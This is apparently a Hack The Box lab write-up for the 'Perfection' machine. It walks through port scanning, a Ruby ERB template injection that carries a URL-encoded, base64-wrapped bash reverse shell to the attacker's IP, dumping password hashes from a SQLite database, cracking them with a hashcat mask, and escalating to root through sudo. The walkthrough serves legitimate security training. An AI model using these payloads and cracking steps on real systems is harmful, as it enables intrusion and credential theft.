---
title: Hack the box Perfection pwned!
date: 2024-03-10 00:00:01 +0000
categories: [hack the box, machine]
tags: [hack the box, machine, perfection, ruby, ssti, password cracking]
img_path: /assets/img/posts/
---

![Perfection info](htb-perfection-info.png)
*Perfection info*

## Annotations

>In this article we are going to assume the following ip addresses:
>
>Local machine (attacker, local host): 10.10.16.108
>
>Target machine (victim, Perfection): 10.10.11.253
{: .prompt-info}

## Enumeration

Let's go look for the open ports in the machine using `nmap`:

`nmap -Pn -n -sS -p- --open -T5 --min-rate 5000 -oN nmap_initial.txt 10.10.11.253'

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Footprinting

We fine tune the scan to see if we can get more information about the running services:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 80e479e85928df952dad574a4604ea70 (ECDSA)
|_  256 e9ea0c1d8613ed95a9d00bc822e4cfe9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see that there is a web service running on port 80, so we browse to `http://10.10.11.253` and we take a look at the web:

![Home](htb-perfection-weighted-grade-calculation-home.png)
*Home*

![About us](htb-perfection-weighted-grade-calculation-about-us.png)
*About us*

![Weighted Grade Calculator](htb-perfection-weighted-grade-calculation-calculate.png)
*Weighted Grade Calculator*

The web contains a too to calculating student grades based on weighting.
If we look at the bottom, we can see that is powered by [WEBrick](https://en.wikipedia.org/wiki/WEBrick).

![Powered by WEBrick](htb-perfection-webrick.png)
*Powered by WEBrick*

[WEBrick](https://en.wikipedia.org/wiki/WEBrick) is a ruby library provinding HTTP web servers.
If we look at more information on the web with wappalizer, we can see that is using Ruby 3.0.2.

![Wappalizer](htb-perfection-wappalizer.png)
*Wappalizer info*

This versions does not seems vulnerable, so we have to try another approach.

## Foothold

### SSTI (Sever Side Template Injection)

As the only place from which we can enter data is the weighted grade calculator, we can try there some [Ruby SSTIs](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby).
The most convenient way is intercepting the request using burp, send it to the burp repeater and modifying it there.
There's a "bad characters" protection, but we can bypass it using url encoding.
Now that we know that there is a SSTI, we can try to inject a reverse shell.
The first thing is start a listener on our machine:

`nc -lvnp 12345`

Now, we need a reverse shell capable to avoid the "bad characters" protection, so we encoded it on base64:

```
echo "bash  -i >& /dev/tcp/10.10.16.108/12345  0>&1" | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTA4LzEyMzQ1ICAwPiYxCg==
```

Now, we wrap it so that the reverse shell will be executed on the server:

`echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTA4LzEyMzQ1ICAwPiYxCg== | base64 -d | bash`


We wrap it so that our payload will be interpreted by ruby taking advantage of the SSTI:

`<%=system("echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTA4LzEyMzQ1ICAwPiYxCg== | base64 -d | bash");%>`

And, finally, we urlencode it:

`%0A<%25%3dsystem("echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTA4LzEyMzQ1ICAwPiYxCg==+|+base64+-d+|+bash");%25>`

Now that we have our payload ready, we will inject it on the request using burp:

![Original request](htb-perfection-wgc-request.png)
*Original request*

![Request payload](htb-perfection-wgc-request-payload.png
*Request payload*

>Note the "1" before the payload
{: .prompt-warning}

We send the request and we got shell!

### susan

First thing is upgrading the tty to be able to work comfortably:

``
script /dev/null -c bash
ctrl+z
stty raw -echo; fg
reset xterm
export TERM=xterm-256color
stty rows 56 columns 209
```

Now, we can start collecting information about our new user:

```
susan@perfection:~/ruby_app$ whoami
susan
susan@perfection:~/ruby_app$ id
uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)
```

```
susan@perfection:~$ ls -lA
drwxr-xr-x 2 root  root    4096 Oct 27 10:36 Migration
drwxr-xr-x 4 root  susan   4096 Oct 27 10:36 ruby_app
-rw-r----- 1 root  susan     33 Mar 16 19:10 user.txt
```

We got our user flag:

`cat user.txt`

We still  need to escalate privileges, so we keep looking.

```
susan@perfection:~$ ls -R Migration/
Migration/:
pupilpath_credentials.db
susan@perfection:~$ ls -R ruby_app/
ruby_app/:
main.rb  public  views

ruby_app/public:
css  fonts  images

ruby_app/public/css:
font-awesome.min.css  lato.css  montserrat.css  w3.css

ruby_app/public/fonts:
JTUHjIg1_i6t8kCHKm4532VJOt5-QNFgpCtr6Hw5aX8.ttf  S6uyw4BMUTPHjx4wWw.ttf

ruby_app/public/images:
checklist.jpg  lightning.png  susan.jpg  tina.jpg

ruby_app/views:
about.erb  index.erb  weighted_grade.erb  weighted_grade_results.erb
```

We see an interesting file: `pupilpath_credentials.db`, so we are going to continue investigating there:

```
susan@perfection:~$ file Migration/pupilpath_credentials.db
Migration/pupilpath_credentials.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 6, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 6
```

A sqlite database called credentials... Let's see what contains!

```
$ sqlite3 pupilpath_credentials.database

sqlite> .tables
users

sqlite> select * from users;
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```

We have some users with their passwords hashes.

If we review Susan's mails, we will find some useful information:

```
$ cat /var/mail/susan
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful students
```

Great! We have the password format and the hash, so we can crack it using hashcat.
We will start with `susan`, since it's our current user.

`echo abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f > hash`
`hashcat -m 1400 hash -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d`

After a while we will have Susan's password, and we will look if she has sudo capabilities.

## Privilege escalation

```
$ sudo -l
[sudo] password for susan:
Matching Defaults entries for susan on perfection:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User susan may run the following commands on perfection:
    (ALL : ALL) ALL
```

Nice! She can run all commands as root without password, so we elevate our privileges:

`sudo su`

And, finally, we get our system flag:

`cat /root/root.txt`

![Perfection pwned](htb-perfection-pwned.png)
*Perfection has been pwned*

*Enjoy! ;)*
